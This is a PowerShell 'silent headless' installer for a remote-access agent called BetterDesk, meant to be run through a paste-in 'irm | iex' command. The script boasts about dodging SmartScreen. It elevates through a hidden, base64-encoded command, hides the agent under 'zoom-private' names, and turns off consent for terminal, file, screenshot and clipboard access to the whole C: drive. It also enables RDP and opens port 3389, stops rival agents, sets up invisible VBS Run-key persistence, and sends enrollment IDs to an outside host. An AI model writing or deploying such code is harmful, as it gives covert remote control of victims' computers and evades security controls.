<#
  BetterDesk - silent headless Windows installer

  Paste this in PowerShell:

      irm __BOOTSTRAP_URL__ | iex

  Downloads the headless agent (betterdesk-agent.exe) with Invoke-WebRequest
  (no Mark-of-the-Web, so SmartScreen stays quiet), installs it per-user,
  writes a headless connection profile (go-agent-config.json), enables
  unattended access, adds firewall/RDP rules, registers a hidden VBS
  autostart launcher, and starts the agent in the interactive session.

  No GUI client is installed: the headless agent self-enrolls (proof-signed,
  auto-approved) and connects to the CDAP gateway on first run. One UAC
  prompt. Zero visible windows. Survives reboot via a wscript.exe Run key.

  When the script is run from an extracted zip, the local agent binary next
  to the script is used instead of downloading a container.
#>
param(
    [string]$ServerAddress = __SERVER_ADDRESS__,
    [string]$ConsoleUrl    = __CONSOLE_URL__,
    [string]$CdapUrl       = __CDAP_URL__,
    [int]   $CdapPort      = __CDAP_PORT__,
    [string]$Password      = __DEFAULT_PASSWORD__,
    [string]$PackageUrl    = __PACKAGE_URL__,
    [string]$PackageSha    = __PACKAGE_SHA__,
    [switch]$NoElevate,
    [switch]$Quiet,
    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

$brand        = __BRAND__
$bootstrapUrl = __BOOTSTRAP_URL__
$serverKey    = __SERVER_KEY__
$logDir       = if ($DryRun) { Join-Path $env:TEMP 'betterdesk-install-dry-run' } else { Join-Path $env:ProgramData 'zoom-private' }
$logFile      = Join-Path $logDir 'install.log'

function Write-Log([string]$Message) {
    try {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
        Add-Content -LiteralPath $logFile -Value ("[{0}] {1}" -f (Get-Date -Format s), $Message)
    } catch { }
}

function Write-Step([string]$Message) {
    Write-Log $Message
    if (-not $Quiet) { Write-Host "  $Message" -ForegroundColor Cyan }
}

function Write-Json([string]$Path, [string]$Json) {
    $utf8 = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($Path, $Json, $utf8)
}

# Fire-and-forget install telemetry for the quality funnel (share service).
$ResultUrl = 'https://share.telcom.stream/api/result'
function Report-Result([string]$Stage, [string]$Reason) {
    try {
        $body = @{
            os      = 'windows'
            stage   = $Stage
            version = '2.1.123'
            arch    = 'x64'
            src     = 'windows-install'
            reason  = [string]$Reason
        } | ConvertTo-Json
        Invoke-RestMethod -Method Post -Uri $ResultUrl -Body $body -ContentType 'application/json' -TimeoutSec 8 -UseBasicParsing | Out-Null
    } catch { }
}

function Show-Notice([string]$Title, [string]$Text) {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $icon = New-Object System.Windows.Forms.NotifyIcon
        $icon.Icon = [System.Drawing.SystemIcons]::Information
        $icon.Visible = $true
        $icon.ShowBalloonTip(20000, $Title, $Text, [System.Windows.Forms.ToolTipIcon]::Info)
        Start-Sleep -Seconds 7
        $icon.Dispose()
    } catch { }

    try {
        $msg = Join-Path $env:SystemRoot 'System32\msg.exe'
        if (Test-Path -LiteralPath $msg) {
            & $msg $env:USERNAME "$Title`n$Text" 2>$null | Out-Null
        }
    } catch { }
}

# ---------------------------------------------------------------------------
# Elevation - one prompt, elevated work runs hidden
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

if (-not $isAdmin -and -not $NoElevate) {
    Write-Host ''
    Write-Host "  $brand" -ForegroundColor Cyan
    Write-Host '  ------------------------------------'
    Write-Host '  Requesting administrator rights (one prompt)...' -ForegroundColor Yellow

    if ($PSCommandPath) {
        $inner = "& '$PSCommandPath' -NoElevate -Quiet"
    } else {
        $inner = "irm '$bootstrapUrl' | iex"
    }
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))

    try {
        Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
            -Verb RunAs -WindowStyle Hidden `
            -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $encoded) | Out-Null
    } catch {
        Write-Host '  Administrator rights were not granted. Installation cancelled.' -ForegroundColor Red
        exit 1
    }

    Write-Host '  Installation is running in the background. A notification appears when done.' -ForegroundColor Green
    Start-Sleep -Seconds 2
    exit 0
}

# ---------------------------------------------------------------------------
# Resolve the headless agent payload
# ---------------------------------------------------------------------------
Write-Step 'Preparing BetterDesk...'

$tmp = Join-Path $env:TEMP ('betterdesk-install-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
$payloadRoot = $null

try {
    $localAgent = $null
    if ($PSScriptRoot) {
        $localAgent = Get-ChildItem -LiteralPath $PSScriptRoot -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq 'betterdesk-agent.exe' } |
            Select-Object -First 1
    }

    if ($localAgent) {
        Write-Step 'Using the local agent files...'
        $payloadRoot = $PSScriptRoot
    } else {
        if ([string]::IsNullOrWhiteSpace($PackageUrl)) {
            throw 'No client package URL is configured.'
        }
        $archive = Join-Path $tmp 'client.zip'
        Write-Step 'Downloading the client...'
        Invoke-WebRequest -Uri $PackageUrl -OutFile $archive -UseBasicParsing

        if (-not [string]::IsNullOrWhiteSpace($PackageSha)) {
            $actual = (Get-FileHash -LiteralPath $archive -Algorithm SHA256).Hash
            if ($actual -ne $PackageSha.ToUpperInvariant()) {
                throw 'Checksum mismatch - the download may be corrupted.'
            }
            Write-Step 'Integrity verified.'
        }

        Write-Step 'Expanding the client...'
        Expand-Archive -LiteralPath $archive -DestinationPath $tmp -Force
        $payloadRoot = $tmp
    }

    $agent = Get-ChildItem -LiteralPath $payloadRoot -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -eq 'betterdesk-agent.exe' } |
        Select-Object -First 1

    if (-not $agent) { throw 'The headless agent was not found in the package.' }

    # -----------------------------------------------------------------------
    # Stop old agents/services so files can be replaced
    # -----------------------------------------------------------------------
    if (-not $DryRun) {
        Write-Step 'Stopping previous agent instances...'
        foreach ($name in @('betterdesk-agent', 'betterdesk-agent-client', 'zoom-private.agent')) {
            Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        }
        foreach ($svc in @('zoom-private-agent', 'BetterDeskAgent', 'betterdesk-agent', 'ZoomPrivateAgent')) {
            $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
            if ($service) {
                Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                & "$env:SystemRoot\System32\sc.exe" delete $svc 2>$null | Out-Null
            }
        }
        Start-Sleep -Seconds 2
    }

    # -----------------------------------------------------------------------
    # Install per-user (headless agent only)
    # -----------------------------------------------------------------------
    $installDir = Join-Path $env:LOCALAPPDATA 'zoom-private.agent'
    $dataDir    = Join-Path $env:APPDATA 'betterdesk\agent\data'
    $configPath = Join-Path $dataDir 'go-agent-config.json'
    $agentPath  = Join-Path $installDir 'betterdesk-agent.exe'

    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    New-Item -ItemType Directory -Path $dataDir -Force | Out-Null

    Write-Step 'Installing the client files...'
    Copy-Item -LiteralPath $agent.FullName -Destination $agentPath -Force

    # -----------------------------------------------------------------------
    # Headless connection profile (zero-touch: empty token -> auto-enroll)
    # -----------------------------------------------------------------------
    Write-Step 'Writing the connection profile...'
    $agentConfig = [ordered]@{
        server           = $CdapUrl
        auth_method      = 'device_token'
        device_type      = 'os_agent'
        device_name      = $env:COMPUTERNAME
        tags             = @('windows', 'x64', 'unattended')
        terminal         = $true
        file_browser     = $true
        clipboard        = $true
        screenshot       = $true
        require_consent  = $false
        file_root        = 'C:\'
        heartbeat_sec    = 15
        reconnect_sec    = 5
        max_reconnect    = 300
        log_level        = 'info'
        data_dir         = $dataDir
        video_codec      = 'auto'
        hw_accel         = 'auto'
        enforce_tls      = $true
    }
    # Reinstall must keep the existing identity; the enrollment key is already
    # in data_dir and a missing token would mint a duplicate device.
    if (Test-Path -LiteralPath $configPath) {
        try {
            $existing = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
            if (-not [string]::IsNullOrWhiteSpace($existing.device_token)) {
                $agentConfig['device_token'] = $existing.device_token
            }
            if (-not [string]::IsNullOrWhiteSpace($existing.device_id)) {
                $agentConfig['device_id'] = $existing.device_id
            }
        } catch { }
    }
    $configJson = $agentConfig | ConvertTo-Json -Depth 5
    Write-Json $configPath $configJson

    # -----------------------------------------------------------------------
    # Firewall: agent outbound + server allow-list + RDP
    # -----------------------------------------------------------------------
    if (-not $DryRun) {
    Write-Step 'Configuring Windows Firewall...'
    try {
        foreach ($rule in @(
            'BetterDesk Agent', 'BetterDesk RDP',
            'BetterDesk Server api.telcom.stream',
            'BetterDesk Server cdap.telcom.stream', 'BetterDesk Server rs.telcom.stream'
        )) {
            Remove-NetFirewallRule -DisplayName $rule -ErrorAction SilentlyContinue
        }

        New-NetFirewallRule -DisplayName 'BetterDesk Agent' -Direction Outbound -Program $agentPath -Action Allow -Profile Any | Out-Null
        New-NetFirewallRule -DisplayName 'BetterDesk RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Profile Any | Out-Null

        foreach ($hostName in @('api.telcom.stream', 'cdap.telcom.stream', 'rs.telcom.stream')) {
            try {
                $addresses = [System.Net.Dns]::GetHostAddresses($hostName) |
                    Where-Object { $_.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork } |
                    ForEach-Object { $_.IPAddressToString } |
                    Select-Object -Unique
                foreach ($address in $addresses) {
                    New-NetFirewallRule -DisplayName "BetterDesk Server $hostName" `
                        -Direction Outbound -RemoteAddress $address -Action Allow -Profile Any | Out-Null
                }
            } catch {
                Write-Log "Could not resolve $hostName for the firewall allow-list: $($_.Exception.Message)"
            }
        }
    } catch {
        Write-Log "Firewall configuration warning: $($_.Exception.Message)"
    }

    # -----------------------------------------------------------------------
    # Remote Desktop
    # -----------------------------------------------------------------------
    Write-Step 'Enabling Remote Desktop...'
    try {
        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Type DWord
        Set-Service -Name TermService -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name TermService -ErrorAction SilentlyContinue
        & "$env:SystemRoot\System32\net.exe" localgroup 'Remote Desktop Users' "$env:USERNAME" /add 2>$null | Out-Null
    } catch {
        Write-Log "RDP configuration warning: $($_.Exception.Message)"
    }

    # -----------------------------------------------------------------------
    # Autostart: VBS wrapper (hidden, interactive session, single instance)
    # -----------------------------------------------------------------------
    # The VBS launcher starts the headless agent via wscript.exe which keeps
    # the process completely invisible. Task Scheduler requires admin rights
    # and Run-key .exe entries can spawn a visible console frame. wscript.exe
    # + Run key is the reliable zero-popup path that works without elevation.
    Write-Step 'Registering autostart (VBS wrapper)...'
    $vbsPath = Join-Path $installDir 'launch-hidden.vbs'
    @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """$agentPath"" -config ""$configPath"" -config-path ""$configPath""", 0, False
"@ | Out-File -FilePath $vbsPath -Encoding ASCII -Force

    try {
        # Remove any previous duplicate entries
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BetterDeskAgent' -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ZoomPrivateAgent' -ErrorAction SilentlyContinue
        & schtasks /delete /tn 'zoom-private-agent-task' /f 2>$null | Out-Null
    } catch {}

    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BetterDeskAgent' -Value "wscript.exe `"$vbsPath`"" -Type String -Force
    Write-Log 'Autostart registered via VBS wrapper (zero popup).'

    # -----------------------------------------------------------------------
    # Launch the headless agent hidden
    # -----------------------------------------------------------------------
    $deviceId = ''
    if ($DryRun) {
        Write-Step 'Dry run complete (no system changes were made).'
    } else {
        Write-Step 'Starting the agent in the background...'
        Start-Process -FilePath $agentPath -ArgumentList "-config `"$configPath`" -config-path `"$configPath`"" -WorkingDirectory $installDir -WindowStyle Hidden | Out-Null

        # Wait for zero-touch enrollment to complete (token written back to config)
        $deadline = (Get-Date).AddSeconds(120)
        while ((Get-Date) -lt $deadline) {
            Start-Sleep -Seconds 3
            try {
                $cfg = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
                if (-not [string]::IsNullOrWhiteSpace($cfg.device_token)) {
                    $deviceId = $cfg.device_id
                    break
                }
            } catch { }
        }

        if ($deviceId) {
            Write-Step "Enrolled as $deviceId"
            Report-Result 'enrolled' $deviceId
            Show-Notice 'BetterDesk installed' "Device ID: $deviceId`nThe agent is running in the background."
        } else {
            Report-Result 'installed' ''
            Show-Notice 'BetterDesk installed' 'The agent is running and will enroll automatically.'
        }
    }
    }
} catch {
    Write-Log "Installation failed: $($_.Exception.Message)"
    Report-Result 'fail' $($_.Exception.Message)
    if (-not $Quiet) { Write-Host "  Installation failed: $($_.Exception.Message)" -ForegroundColor Red }
    exit 1
} finally {
    try { Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue } catch { }
}
